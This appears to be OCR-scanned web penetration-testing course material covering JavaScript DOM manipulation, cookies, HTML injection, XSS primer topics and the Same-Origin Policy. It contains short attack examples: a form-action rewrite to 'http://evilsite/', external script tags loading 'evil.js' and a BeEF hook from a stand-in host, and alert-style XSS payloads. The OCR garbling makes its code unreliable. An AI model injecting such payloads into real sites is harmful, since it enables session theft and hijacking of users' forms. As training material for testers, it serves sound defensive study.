• Property: length returns history item count 
• Example: history .back() ; 
'-.J 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'---' 
'-" 
'---' 
There are eight different built-in objects provided by JavaScript. They are the string, date, math, window, 
document, location, history, and array objects. These objects provide various methods and properties and make 
up a major part of the application code we find and use during penetration tests. 
24 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
'-J 
'-" 
'-" 
'-J 
'-" 
'---' 
'-" 
'---' 
'---' 
'-' 
'-' 
'-J 
'-.J 
'---' 
'---' 
'-J 
'-' 
'-J 
'-' 
'-J 
'-" 
\..../ 
'-' 
'-" 
Selecting and Changing Content 
Scripts can "walk" the tree to find specific elements 
• Function to count the number of <input> tags in a page 
function counttags(tag) 
{ 
count= document.getElementsByTagName(tag) .length 
return count 
} 
The script can then read the item's attributes and associated items such as text 
• Determine the URL of an image on the page 
source= document.images["Logo"] .src; 
The script can then rewrite the item 
• Rewrite the action and submit the form 
document.getElementByid('myForm') .action= "http://evilsite/" 
document.getElementByid('myForm') .submit() 
('\ 
One of the main functions that we perform is changing content on the page. There are various ways to find the 
item that we are interested in changing. We could reference the item by its ID or by its name. We can also loop 
through each of the items and change all the items of a specific type. 
Once we find the item, we can use the various properties, such as the action of a form, to change the content to 
what we would like. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
25 
'---" 
Interacting With Cookies 
Reading cookies is simple: strCookie = document. cookie; 
• Remember document.cookie returns only the name=value pairs 
Parsing the cookie takes a little more work 
• First parse to split each name=value pair 
var arrValues =document.cookie.split(';'); 
• The next step would be to loop through each pair and split on the = 
o Code for doing this is located in the notes 
Setting cookies requires only three/four parameters 
• A cookie name and value pair 
• An expiration time for the cookie and URI path that is able to access it 
document.cookie= "userid=ford;expires=Fri, 4-May-2018;path=/"; 
• Date parameter not required for session cookies 
'---" 
'-----' 
'----" 
'----" 
'----" 
'-----' 
'----" 
'-----' 
'----" 
'-----' 
'----" 
'-----' 
'-./ 
'-----' 
Another common function used during tests is to manipulate and/or read cookies. The attacker can read cookies by 
calling document.cookie object and property. When reading cookies, the tester has two choices. The first is to use the 
cookie value as a whole or we can use code similar to the listing below to parse the cookie into individual values. 
var a all cookies = document.cookie.split( '.' ) 
I 
var a temp cookie = I I• 
I 
var cookie name = ''. 
I 
var cookie value = I I• 
- 
I 
var b cookie found= false; 
for ( i = 0; i < a all_cookies.length; i++) { 
a temp cookie= a_all_cookies[i] .split( 
'=' 
); 
cookie name= a temp cookie[O].replace(/"'\s+l\s+$/g, "); 
if ( cookie name== check_name) { 
b cookie found= true; 
- 
- 
if ( a temp cookie.length> 1 
) { 
cookie value 
unescape (a temp cookie [l]. replace (/"'\s+ 
I \s+$/g, 
'') 
) ; 
return cookie value; 
break; 
a temp cookie 
null; 
cookie name 
I I. 
I 
26 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-----' 
'-...., 
'-----' 
'----" 
'----" 
'-...., 
'--.,I 
'----" 
'----" 
'----" 
'----" 
'-" 
'-....,· 
'-" 
'-----' 
'----" 
'----" 
'----" 
'-' 
'-' 
'-' 
'----" 
''-..J 
'---' 
'--./ 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
• Day 4: :XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
XXEandXSS 
I. XXE 
l. Exercise: XXE 
3. Document Object Model (DOM) 
4. Cross-Site Scripting (XSS) Primer 
S, Classes ofXSS 
6, Exercise: X.SS 
1. Discovering XSS 
Impacts 
E:l!ien:ise: HTML Injection 
XSS Tools 
IL 
I l. Exercise: BeEF 
13.AJAX 
14. API Attacks 
i S. Data Attacks 
16. Exercise: AJAX XSS 
17. Summary 
SEC542 I Web App Penetration Testing andj;fuical Hacking 
21 
Course Roadmap 
The next section begins our dive into Cross-Site Scripting (XSS). 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
27 
\.....I 
'---" 
Introduction• to XSS 
Other than SQL injection, Cross-Site Scripting is perhaps the most well-known 
web application flaw 
• Abbreviated as XSS due to Cascading Style Sheets' prior use of "CSS" 
OW ASP: XSS is "the most prevalentfl.aw in web applications today"1 
Considerably more difficult to prevent XSS bugs than SQLi, RFI/LFI, and 
command injection flaws 
While the web application exhibits the flaw, most obvious and likely victim will 
be application end users rather than vulnerable application 
• For some orgs, this offers less incentive to address these flaws in a timely fashion 
\.....I 
\.....I 
\.....I 
'---" 
'---" 
'-' 
'---" 
'-' 
'-' 
'-J 
'-' 
\.....I 
'-' 
'-' 
We will now turn our attention to Cross-Site Scripting, commonly abbreviated as XSS rather than CSS since that 
acronym points to another web-related technology- Cascading Style Sheets. Cross-Site Scripting is, perhaps, 
save SQL injection, the most well-known web application flaw. Even more well-established than the name 
recognition of the flaw is the ubiquity of the flaw. XSS flaws are considered the most commonly found flaws in 
production web applications.2 
Unlike many other popular web application flaws, rectifying XSS bugs poses a more significant challenge. To 
make matters even more interesting, the most overt victim ofXSS exploitation tends to be the end user of the 
application rather than the vulnerable application. This fact makes some organizations rather less motivated in 
fixing these flaws compared to those whose impact is more overtly the organization. So, XSS presents a 
widespread flaw that is difficult to fix with less obvious incentive for organizations to fix in a timely fashion. 
The difficulty in avoiding XSS flaws, their popularity, and their primary impact being associated with end users 
of the application rather than the application itself, makes for an extremely important and powerful flaw for the 
web application penetration tester to understand, discover, and exploit. 
References: 
[1] https://www.owasp.org/index.php/Cross _ Site _Scripting_Flaw (https://cyber.gd/542 _ 441) 
[2] Ibid. 
28 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
\.....I 
'-' 
'---" 
'-/ 
'-' 
'-' 
'-' 
'-/ 
'-' 
'-' 
"--' 
'-./ 
'-./ 
'-./ 
'-/ 
'-' 
\.....I 
'-/ 
'-' 
"--' 
'-.,/ 
'-' 
'-' 
'-/ 
'-.J 
'-/ 
OTG-Cl..lENT-003:Test for HTML Injection 
"HTML injection is a type of injection issue that 
occurs when a user is able to control an input point 
and is able to inject arbitrary HTML code into a 
vulnerable web page .. This vulnerability can have 
many consequences, like disclosure of a user's 
session cookiesthat could be used to impersonate 
thevictim, or, more generally, it can allow the 
attacker to modify the page content seen by the 
victims. "1 
The purpose of OTG-CLIENT-003 is to assess the application for HTML injection flaws. These flaws, when 
exploited, allow the penetration tester to inject their own malicious HTML code into the response from a 
vulnerable web application. 
Reference: 
[I] https://www.owasp.org/index.php/Testing_for _ HTML _Injection _(OTG-CLlENT-003) 
(https://cyber.gd/542 _ I 59) QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
29 
'--' 
I-ITMLlnjection 
Before digging into proper XSS, let's first consider HTML injection 
With HTML injection, we are able to provide maliciously crafted input that 
results in attacker-controllable HTML within the server's response 
• The primary goal of HTML injection is to get arbitrary HTML code to be rendered by a 
victim browser 
Though the application's lack of sanitization is the flaw, the most 
overt victim would be the browser rendering the attacker's HTML 
Though we will primarily focus on XSS, even if we can only achieve 
HTML, but no JavaScript, injected we could still show meaningful, 
or at least funny, impact 
Though we now know a bit about the surrounding landscape for XSS flaws, we still have a way to go before we 
can really appreciate this incredible, important, and common web application flaw. 
Before we dig into XSS directly, let's consider a very closely related flaw, HTML injection. This web 
application flaw is one in which adversaries are able to introduce their own maliciously crafted HTML into the 
vulnerable application's response. This response, sent from the ostensibly trustworthy web server of the 
application, will include content unintended by the organization responsible for the application. 
The flaw allows for the adversary to inject HTML into the server's response to others. This flaw can, at once, be 
thought ofin terms of the failure to properly handle malicious input, and also be considered flawed in the way in 
which it delivers output without ensuring that it is safe for consumption by users of the application. 
As we will see shortly, in truth, there is conceptually rather little difference between an HTML injection flaw 
and many manifestations of Cross-Site Scripting. In fact, there will likely be times when you might not be able 
to properly weaponize an XSS exploit, but HTML injection will still prove compelling. 
Note: HTML-injected image of Microsoft Clippy used from the BeEF project, which will be discussed later. 
30 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'--,/ 
'-' 
'-.../ 
'--' 
'-.../ 
'-.../ 
'-' 
'-.../ 
'--,/ 
'--,/ 
'-.../ 
'-' 
'-.,, 
..__,, 
'-.../ 
'--,/ 
'-.../ 
'-../ 
'-.../ 
'-.../ 
'-../ 
'-' 
'-.../ 
'-..,,' 
'-.,, 
'-.-' 
'--,/ 
-.._./ 
'-.../ 
'--' 
'-.../ 
'--' 
'-.../ 
'--,/ 
'-.../ 
"--./ 
'-.,,' 
'-../ 
'-../ 
Injected H'TMI..: Go Weird or Go Home 
name? 
Normal input: Zaphod 
Normal rendered: 
HTML-injected input: 
<hl style=-moz-transform:rotate(-180deg);>Zaphod</hl> 
Rendered output: 
Now that's 
more like it! 
Zaphod is anything but normal ... 
He started by supplying simply his own name as input to the form's question: 
wners your name? 
The web page did include his name in the resultant response. 
I He Ho Zaphod I 
He thought the page could use a little flourish if it was going to be using his name in their content. So, Zaphod 
decided to add a little embedded CSS styling to accentuate his own oddity. 
<hl style=-moz-transform:rotate(-180deg) ;>Zaphod</hl> 
Of course, he had to go big with an <hl> tag. Then, Zaphod included a moz-transform: rotate() 
function he had read about.1 He passed a parameter of -180deg to the function. The <hl> with added style 
input definitely resulted in content much more to his liking. 
Hello poqdez 
Reference: 
[ 1] https://developer.mozilla.org/en-US/docs/Web/CSS/transform (https://cyber.gd/542 _32) QR 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
31 
..__.,, 
\._/
\._/
Script Injection 
Now let's consider the <script> aspect of Cross-Site Scripting 
XSS often feels like manifestation of HTML injection with JS able to be injected 
Imagine performing a simple website search for: Gargle Blaster 
Restaurant At The End Of The Universe 
Drink Lookup: f~""""'"" 
..,._._ 
May we also suggest meeting the Dish of the Day. 
4;! parg!e Blaster'slon their way. 
The Dish of the Day will also be to your table soon. 
Now input: 
<script>alert(42) ;</script> 
Input landed within HTML 
Console 
DBbugger 
<ti:2->Restaurant At 
fnd 0-f Tne 
... obligatory 
alert() POC 
" 
\..,.I 
'-...,I
'-' 
'-' 
\._/ 
'-' 
'-"' 
--.J 
--.J 
While an oversimplification, thinking of Cross-Site Scripting as Script Injection can prove useful, especially for 
those relatively new to thinking in terms of client-side web application flaws. Let's see a simple example script 
injection to get started. 
'-"' 
'-' 
We search for a (Pan Galactic) Gargle Blaster. 
We see our input results in a query parameter and visible content. 
12e 
J3J~~~~-~-·_s)on their way. 
The Dtsh er the Day wm atso be to your table soon, 
Though lame, the most basic XSS PoC always presented involves injection of JavaScript that yields a pop-up 
box when rendered: 
<script>alert(42) ;</script> 
This results in the expected pop-up box. Also, looking in Firefox Developer Tools: Web Console 
(Ctrl+Shift+K) or (Cmd+Opt+K), we can see the context within which the script was injected. This will allow us 
to begin thinking about how to move beyond the alert ( 42) . 
Console 
<h2>Restaurant At The End Of 
Lh11verse..-;/i12> 
42 
32 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-' 
\._/ 
\._/ 
'-' 
'-' 
'-../ 
''-"' 
\._/ 
\._/ 
\._/ 
\._/ 
\._/ 
'-' 
'-' 
.'-./ 
'-' 
\._/ 
'-' 
\._/ 
'-.J 
'-../ 
'-' 
'-' 
'-...,I 
'-.-I 
--.J 
'-' 
Origin of Trust 
As web application security professionals, the idea of an origin 
server should immediately bring to your mind the concept of 
Same-Origin Policy, often abbreviated SOP 
• Basic and critical security component of web 
• Goal to make us feel a tad bit safer running mobile code 
When you think about it, this is totally scary ... We are allowing a 
third party to present code we have never seen and run on our 
systems for every site we hit 
One of the oldest and most basic of web application security protections, Same-Origin Policy, still proves to be 
rather significant for overall security. The primary goal of SOP is to make us feel somewhat safer about the idea 
of browsing many different destinations of varied levels of trust and executing mobile code from them. 
SOP does not actually prevent our hitting those sites or even running all of their scripts. That is not the focus of 
SOP. Rather it is focused squarely on making us feel more comfortable about running all of those scripts from 
folks throughout the world we don't know. It tries to achieve this by governing how interactions will occur 
between different origin servers' code and content. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
33 
'-.J 
'-.J 
Imagine hitting your online bank (https://brantisvogan.bank.test) in one 
tab and simultaneously having another tab open to a sketchy/ scary site 
(https://vortex.test) 
Barring any extra security precautions, both sites will be able to present 
JavaScript to your browser and have their code render 
• This is perfectly acceptable ... the scary web works as designed 
SOP would only flex its muscles when code from https://vortex.test tries to 
access content delivered from the origin server 
https: / /brantisvogan. bank. test 
'-.J 
'-' 
'---/ 
'-.J 
'---/ 
'-.J 
'-' 
'-' 
'-' 
'-----' 
'-' 
'-.J 
'-' 
'-' 
The idea of the Internet and all the untrusted, and often untested, applications being allowed to interface with my 
applications, or, even a bit scarier, for me to hit their sites is terrifying. Executing scripts on other random sites 
is part of the fun and fear that makes the internet exciting ... SOP doesn't really care at all about the scripts you 
have accessed, trusted, and executed that you later realized you shouldn't have. 
By default, what would not be acceptable, and is the point of SOP, would be for code from https://vortex.test to 
be able to access content sent to your browser from your online bank https://brantisvogan.bank.test. 
Though there are more specifics to hash out, you've certainly all got the gist of SOP sufficiently that we can 
continue on with the XSS Primer. 
34 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.J 
'-' 
'-.,./ 
'-' 
'-.J 
'-' 
'---/ 
'-' 
'--" 
'-' 
'-' 
'-../ 
''---/ 
'-' 
''----' 
'-' 
'-' 
'---/
'-.J 
'-.../ 
'-' 
'-' 
'-.J 
'-' 
'---/ 
Same-Origin Policy Requirements 
For code to be considered having been delivered from the Same- 
Origin it must match on the following: 
• Port - not typically an issue, but be aware, especially if using tools to target 
an internal application that uses a nonstandard port for HTIP /HTIPS 
• Scheme/Protocol - HTIP I HTIPS most common difference encountered 
• Host - here is the main source of variance and real meat of SOP restrictions 
Same-Origin determinations and SOP restrictions are governed by 
the browser 
Kinda simple, but ... 
• Without SOP, the flaw wouldn't be Cross-Site Scripting it would just be 
Scripting ... 
Should one script delivered to a client be able to interface with a particular DOM in the browser's memory? 
This is the basic question that Same-Origin Policy seeks to answer. SOP considers information found within 
HTTP request headers to determine whether access should be provided. Specifically, SOP considers the port, 
protocol, and host identified in a client request to see whether this constitutes the Same-Origin server. 
Port: Unless otherwise specified, we, of course, expect HTTP requests on TCP/80 and HTTPS on TCP/443. A 
common deviation penetration testers will encounter occurs when testing internal servers and applications, 
which, with some regularity, can run on nonstandard ports. 
Protocol: Though other cases exist, the most commonly encountered differences involve some resources being 
transferred over HTTP rather than HTTPS. 
Host: This constitutes the primary focus of SOP from our perspective. 
Even though the above is, admittedly, rather simplistic, without this simple security control simply having a 
client run a script from any domain would have the same impact we will see associated with XSS. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
35 
\._./ 
\._./ 
SOP .. Test Cases: DOM 
htt s ://brantisvo ··an. bank. test/balance. 
• • Same-Origin Policy enforcement of DOM (Document Object Model) is stricter than 
other SOP enforcement (such as cookies, discussed next): 
• Would SOP allow https://brantisvogan.bank.test/balance.php to access the following 
sites? 
https://vortex.test/ 
http://brantisvogan.bank.test/ 
https://brantisvogan.bank.test:4343/ 
https://bank.test/ 
https: //10.5.42.1/ 
Host 
Protocol/Scheme 
Port 
Host 
Host 
'-._.; 
Even though SOP is fairly straightforward and simplistic, we will take a moment to consider a few test cases to 
ensure that there is no ambiguity. There are a few cases that can take novice testers by surprise if they haven't 
spent much time playing in the web app space. 
One cautionary caveat emptor before we dig in. Recall that SOP is enforced by the web client/browser. Though 
seemingly simplistic, there are cases where enforcement of SOP differs across browsers. 
Notably: Internet Explorer's handling of the Document Object Model SOP is laxer (by default) than other 
browsers, and ignores the port: 
in order to understand SOP, you must first understand what an origin is. For the purposes of this post, 
I'll simply give the simplified explanation that an origin is a string consisting of the protocol/scheme 
and fully qualified hostname of a given piece of content. A web page from 
http://www.example.com/a.htm has the origin "http://www.example.com". 
The reality is a bit more complicated than that; in every browser except Internet Explorer, the origin 
includes the server's port (if specified), while in IE, the content's Security Zone is a part of the origin 
instead.' 
Reference: 
[I] https://blogs.msdn.microsoft.com/ieinternals/2009/08/28/same-origin-policy-part- I -no-peeking/ 
(https://cyber.gd/542 _ 433) 
36 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-._.; 
..__, 
..__, 
..__, 
..__, 
'---' 
'---' 
..__, 
'---' 
.'--"' 
'---' 
'---' 
'---' 
'--"' 
'---' 
. ......., 
..__, 
"----- 
'---' 
..__, 
..__, 
..__, 
'---' 
..__, 
...___., 
...___., 
...___., 
'---' 
..__, 
...___., 
'-._.; 
'---' 
...___., 
...___., 
'---' 
'---' 
...._, 
'---' 
SOP Test Cases: Cookies 
• Most browsers' enforcement of the Same-Origin Policy regarding 
cookies is far laxer than DOM SOP enforcement 
• Michal Zalewski discusses this in his ( excellent) Browser Security 
Handbook: 
oScope: by default, cookie scope is limited to all URLs on the cu_r_rent host 
name - and not bound to port or protocol information. 1 
• Additionally: the cookie 'domain' parameter matches subdomains 
as well 
o See notes for details 
Zalewski also discusses domain enforcement for cookies: 
Note: according to one of the specs, domain wildcards should be marked with a preceding period, 
so .example.com would denote a wildcard match for the entire domain - including, somewhat 
corifusingly, example.com proper-whereasfoo.example.com would denote an exact host match. Sadly, 
no browser follows this logic, and domain=example.com is exactly equivalent 
to domain=.example.com. There is no way to limit cookies to a single DNS name only, other than by 
not specifying domain= value at all - and even this does not work in Microsoft Internet Explorer; 
likewise, there is no way to limit them to a specific port. 2 
Zalewski provides historical context for this design in his (also awesome) The Tangled Web: 
Amusingly, the original RFCs imply that Netscape engineers wanted to allow exact host-scoped 
cookies, but they did not follow their own advice. The syntax devised for this purpose was not 
recognized by the descendants of Netscape Navigator (or by any other implementation for that matter). 
To a limited extent, setting host-scoped cookies is possible in some browsers by completely omitting the 
domain parameter, but this method will have no effect in Internet Explorer. 
References: 
[ 1] https://code.google.com/archive/p/browsersec/wikis/Part2.wiki (https://cyber.gd/542 _ 442) 
[2] ibid. 
[3] Zalewski, Michal. The Tangled Web: A Guide to Securing Modern Web Applications. No Starch Press, 2012. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
37 
'-...I 
so·p and···Exterrially·.··sourcedScripts·•··•••····· 
i 
. 
A less obvious SOP test case we must understand is externally sourced scripts 
Imagine the following received from https: //brantisvogan .bank. test: 
<html><head><title>Brantisvogan World Bank</title></head><body> 
<p>See Civil Service for all Change of Address needs</p> ... 
<script src="http://vortex.test/evil.js"></script> 
... </body></html> 
Would SOP allow Zaphod's evil. js script 
to read ChangeOfAddress' cookie value? 
Performa... 
O Merner, 
Nerwcrk 
Domain 
\.._.I 
\.._.I 
'----' 
'----' 
\_,, 
'----' 
'----' 
'----' 
'----' 
'-' 
Folks relatively new to web application security and/or HTML/JS source code often stumble over this one, so 
we wanted to take some time to cover this angle explicitly. The stumbling block is with coming to terms with 
externally sourced scripts. 
Here is an example of an externally sourced script. 
<script src="http://vortex.test/evil.js"></script> 
This script was delivered to the client within an HTML page from Brantisvogan World Bank. Would SOP 
allow for Zaphod's evil. js script to read the value of the ChangeOfAddress cookie set by the bank? 
Gl 
O InspE!ttor 
Coosolsi 
C> Diibugger 
( } Style Editor 
P,Hh 
mantisvogari.oa 
Answer is .... YES! 
rertorma... 
Memory 
For many folks, the way in which this works with respect to SOP seems, at first, totally counterintuitive. 
38 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
\_, 
\_,, 
'----' 
'----' 
\_, 
,._,, 
'---' 
'-./ 
'-.,/ 
'-./ 
'-./ 
'-./ 
'----' 
'---' 
\_,, 
'-...,• 
-.___, · 
'-.,/ 
'----' 
'----' 
'---' 
'-' 
'-./ 
'---' 
'----'
'-./ 
'-./ 
\.._.I
'-./ 
\_, 
<script src="awesome-sauce.js"></script> 
• Browser sees the origin server as having requested we fetch the external 
script 
• Externally sourced scripts not violating SOP affords us tremendous 
capabilities when an XSS flaw is discovered 
• Most viable injection points would not, for example, allow for thousands and 
thousands of lines of JavaScript to be introduced inline 
o But with a simple externally sourced script, we can often have many more lines of code 
than would otherwise be permitted 
• Perhaps a tidy little pointer to an unobfuscated BeEF hook: 
<script src="http://vortex.test/hook.js"></script> 
• We will spend some time exploring the power of BeEF later 
Now you know the result, but you'd be forgiven if this is news to you and you are still stuck scratching your 
head. Let's think through this to be sure we are all tracking. When the browser hits a reference to an externally 
sourced file containing JavaScript, from an SOP perspective, it is as if all the lines of JavaScript had simply been 
written in place of that single pointer to the script itself. Think of it as just letting a trusted third party hold and 
deliver files on their behalf. 
What is especially awesome for us is that with XSS, it means that we can be perceived as that trusted third party, 
even though we are using this as a means to wreak havoc on the application and the end users. Externally 
sourced scripts are also incredibly important and powerful for us due to the common length limits we hit with 
injection points. 
As long as we have enough space for our XSS payload to point to a remote script, then the space limitation 
usually goes by the wayside and we can drop potentially thousands of lines of code in something that only is 
intended to allow maybe 15-20 chars. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
39 
'--" 
Not Bypassing SOP 
For the purposes of this section we will not be attempting actual 
SOP bypass 
Rather, with XSS, we will be presenting our scripts as if they came 
from the origin server itself 
• Either via getting our full script contained within content served directly by 
the Origin Server 
• Or, as is especially common with more complex attacks, via a pointer to an 
externally sourced script 
SEC542 l Web App Penetration Testing and Ethical Hacking 
-io 
'--" 
..._.,, 
..._.,, 
..._.,, 
'-' 
..._.,, 
..._.,, 
'-' 
'-----' 
..._.,, 
..._.,, 
'-' 
..._.,, 
'-----' 
'-' 
..._.,, 
SOP bypasses most often involve exploiting client software or runtimes rather than the web applications. So, we 
are not going to exert a tremendous amount of effort trying to bypass SOP. 
Also, given the way <script src=" / /sec542. org/evil. js "> works, we are not as limited as one 
might think. Of course, this presumes that we can actually find an XSS flaw in the application to really 
weapomze. 
But, once we do, then our hosted scripts become very good friends ... 
40 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.J 
'-' 
'-...,I 
..._.,, 
"---' 
'-----' 
'--" 
'-...,I 
'-" 
..._.,, 
..._.,, 
'-' 
..._.,, 
..._.,, 
'-...,I 
'-----' 
'-...,I 
'--' 
..._.,, 
'-' 
'-" 
'-' 
___.,., 
Putting the Cross-Site in Cross-Site Scripting ... 
The previous example searched for <script>alert ( 42) ; </ script> in the 
vulnerable app directly from the victim browser 
• While useful, as we will see later, this doesn't speak to an adversary being able to 
surreptitiously inject this script into the content presented to the victim 
• Using our simple example, how could we trick the user into performing our malicious 
search of <script>alert ( 42) ; </ script> so that they, rather than we, experience 
that ding of the all-powerful pop-up box in their browser 
The goal of Cross-Site Scripting is typically not just to get the victim to run 
JavaScript, if that were the goal, then we likely wouldn't need to go to this level 
of effort ... Rather, the goal is to get that content to be presented as coming from 
a particular origin server 
41 
Our scratch-the-surface primer to XSS is still missing a rather fundamental piece presented in the name of the 
flaw itself. Namely, the Cross-Site aspect of Cross-Site Scripting. Alright, so what we are about to discuss isn't 
really where the Cross-Site angle came from, but regardless, the fact remains we haven't considered any aspect 
of delivering your XSS bombs to any potential victims yet. 
We, and real-life adversaries, will need to consider how to introduce our maliciously crafted content to a user of 
the application. Obviously, they will have to do this in order to derive value and achieve exploitation. For us, it 
could well be a component of our engagement. Notably, though, there are absolutely instances where delivering 
or any serious demonstration of capabilities is well beyond the scope of what we are tasked with performing. 
Typically the first, but not necessarily the only, goal is to identify and detail application vulnerabilities. 
Demonstrating possibilities can help provide some desperately needed context (and incentives) to help 
organizations appreciate the true risk associated with the flaw. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
41 
'-' 
\.J 
\.J 
Pop-Ups GoneiWild 
For initial testing and discovery of XSS flaws, simply having PoC code generate 
pop-ups within our own browser will likely be sufficient 
Conveying potential adversary capabilities will require more meaningful 
demonstration of impact beyond an alert () 
MUHUHUHUHAHAHAHAHAHAHAHAHAHAAH!!! ! !! 
Kne<:l before my 
box skil lz! ! ! ! 
Please don't consider a screenshot of a pop-up box, especially without context, 
to be sufficient demonstration of the risks associated with XSS 
'--' 
\..J 
\.J 
\.J 
\.J 
\.J 
\._.,, 
\.J 
'-' 
\.J 
\.J 
'-' 
\.J 
\..J 
\.J 
.-._/ 
\.J 
Keep in mind that for adversaries and more meaningful demonstration of impact, going beyond a simple pop-up 
box within your own browser will definitely be required. In the authors' experience, many organizations seem to 
have difficulty understanding and appreciating XSS flaws. Without that understanding, they will have little hope 
of realistically assessing the risk associated with the flaw or fix. 
Even funny pop-ups aren't sufficient for helping out organizations ... 
MUHUHUHUHAHAHAHAHAHAflAHAHAHAAH!l!!!! 
Kneel before my alert() box sldlizli!! 
We will discuss later considerations around filtering and filter bypass that are related to considerations of 
meaningful demonstration and real-world exploitation. 
'-' 
\..J 
\.J 
\.J 
\.J 
\.J 
'-" 
\.J 
'-" 
'-" 
'-../ 
\.J 
\..J 
\..J 
'-" 
'-" 
\..J 
'-" 
\.J 
\.J 
\..J 
42 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
'-" 
Simple alert() Alternatives 
We will discuss more substantial alternatives to browser pop-ups, but simple 
alternative functions to alert ( 42) can be useful 
_,,,, 
Classic: 
alert (42) ; • 
confirm.(42); 
Fun alternative: ~ 
prompt("What do you get if you multiply six by nine?","42"); 
SEC542jWeb App Penetrati.on Testing and Ethical Hacking 
43 
Though the alert() is certainly straightforward enough to not cause tremendous problems on its own. There are 
shops that will get all sneaky and try to stomp on our tools and efforts to exploit them. Far and away the most 
common method of trying to thwart most application flaws is through input filtering. 
Quite often input filtering is far too simplistic pattern matching blacklists and can be bypassed. To that end, it 
might prove useful to have a couple other simple JS functions to cause those PoC pop-up boxes. 
Classic: 
alert(42); 
Classic look, more style: 
confirm(42); 
Fun alternative: 
- 
prompt("What do you get if you multiply six by nine?","42"); 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
43 
\...., 
\...., 
Course Roadmap 
• Day 1: Introduction and Information 
Gathering 
• Day 2: Configuration, Identity, and 
Authorization Testing 
• Day 3: Injection 
· Day 4: XXE and XSS 
• Day 5: CSRF, Logic Flaws, and 
Advanced Tools 
• Day 6: Capture the Flag 
XXEandXSS 
!.XXE 
2. Exercise: XXE 
3. Document Object 
4. Cross-Site 
Primer 
S. Classes of XSS 
6. Exercise: XSS 
1. Discovering XSS 
8. XSS Impacts 
9. Exercise: HTML Injection 
Hi. XSS Tools 
i L BeEF 
i 2. Exercise: BeEF 
13.AJAX 
API Attacks 
!5. Data Attacks 
Exercise: AJAX XSS 
17. Summary 
SECS42 I Web App Penetration Testing and Ethical Hacking 
44 
\...., 
'-" 
'----' 
'-" 
'-../ 
'----' 
'-" 
'-' 
'----' 
'----' 
'-" 
\...., 
'-../ 
'-" 
'-" 
'-" 
'-../ 
Course Roadmap 
'-" 
\...., 
Let's explore classes of XSS next. 
\...., 
'-../ 
'-../ 
'----' 
'-" 
'-" 
'-" 
~ 
'----' 
'-../ 
'-' 
'-" 
'-" 
'-" 
'-" 
'-" 
'-../ 
\...., 
44 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-" 
'-" 
Classes of XSS 
Three major classes of Cross-Site Scripting flaws exist: 
• Reflected (Non-Persistent or Type 2) 
• Stored (Persistent, Type 1) 
• DOM-based (Type o) 
Nomenclature and classification is not perfectly clear or agreed upon 
• We will explore some of this nuance as we attend to the flaws themselves 
In each case, goal is achieving JavaScript execution in the browser 
• The way in which this goal is achieved differs in each class 
Two other attacks, Self-XSS and Universal XSS (UXSS), described 
in the notes, are not germane to our web application focused training 
Though there are different ways of classifying XSS flaws that some professionals will employ, the most 
common way of categorizing them is as Reflected, Stored, or DOM-based. Though these names are very 
commonly used, other names and categories are common enough to warrant discussion. 
Universal Cross-Site Scripting, often abbreviated UXSS, certainly sounds like it would be a class of Cross-Site 
Scripting we would dig into. However, UXSS isn't typically a web application flaw at all, but rather is a method 
of injecting JavaScript by means of exploiting a separate tool. The most common UXSS targets are, 
unsurprisingly, the browser and associated plugins. 
Another seeming class ofXSS that we will not be exploring is one referred to as Self-XSS. This attack involves 
scammers tricking their unsuspecting victims into copying or typing commands into the address bar that lead to 
adversary-controlled JavaScript execution. 
As with most things in information security, there are variations upon these themes and a lack of universal 
agreement upon the nomenclature used above. 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
45 
'----' 
"---' 
'-'
Reflected XSS 
Reflected is the most basic example of Cross-Site Scripting flaws 
• Easiest to understand 
• Simplest to discover (both manually and programmatically) 
• Most commonly used examples 
Another name you encounter for Reflected XSS: Non-Persistent 
• Both names are illustrative and speak to the way the flaw presents in 
applications 
Let's see this flaw in action to better understand what is going on 
here 
'--'
'--'
'-.../
'-' 
'-.J
'-' 
'-.J
'-../ 
'-'
'-../ 
'-../ 
'-' 
'-.J 
'-.J
Without question, the most well-known and common type of Cross-Site Scripting flaw is Reflected XSS. The 
commonality is due, in part, to this type of flaw being both easier to understand as well as simpler to discover 
and exploit. Both manual and automated techniques to discover these flaws abound due to the nature of the flaw 
immediately providing results to the adversary or penetration tester. 
Let's look at an example to understand this flaw and appreciate how we will find and exploit it. 
46 
© 2018, Seth Misenar, Eric Conrad, and Kevin Johnson 
'-.J 
'-../ 
'-.J 
'--' 
'-.../ 
'-../ 
'-.J 
'-' 
'-../ 
'-.J 
'--' 
'-.J 
'-../ 
'-' 
'-.J 
'--' 
'-.J 
'-.J 
'-.J 
'-.J 
'-.J 
'--' 
'-.J 
'-.J 
'-' 
Reflected XSS - Illustration 
Target:http://dvwa/vulnerabilities/xss_r/ 
What's your name? 
Form input: 
II Submit l 
Reflected input: 
Hellolzaphodl 
v <div class="vulnerable_code_area''> 
• <form name="XSS" action="t" method="GET"> 
<p>What's your name?</p> 
<input name="name" type="text"> 
<input value-·submit" type="submit"> 
